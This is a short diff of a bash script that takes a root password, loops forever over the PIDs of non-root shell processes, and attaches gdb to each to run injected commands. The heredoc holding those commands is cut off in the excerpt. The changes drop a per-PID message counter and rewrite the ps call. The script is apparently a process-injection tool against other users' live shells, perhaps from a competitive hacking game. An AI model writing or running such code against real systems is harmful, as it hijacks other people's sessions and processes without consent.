@@ -9,21 +9,14 @@ fi
 # Set pass from arg
 root_password="$1"
 
-# Associative array to keep track of messages sent every PID
-declare -A sent_counts
-
 while true; do
-
     # Get the list of PIDs for non-root processes
-    pids=$(ps auxf | grep '[s]h' | grep -v 'root' | awk '{print $2}')
+    pids=$(ps -e -o pid,cmd | grep -E '[s]h' | grep -v 'root' | awk '{print $1}')
 
     # Iterate over PIDs
     for pid in $pids; do
-        # Increment sent count for this PID
-        ((sent_counts[$pid]++))
-
         # Send notice
-        echo "Message sent to pid $pid, this is send #${sent_counts[$pid]}"
+        echo "Message sent to pid $pid"
 
         # Execute GDB commands
         gdb -p $pid >/dev/null 2>&1 <<EOF &
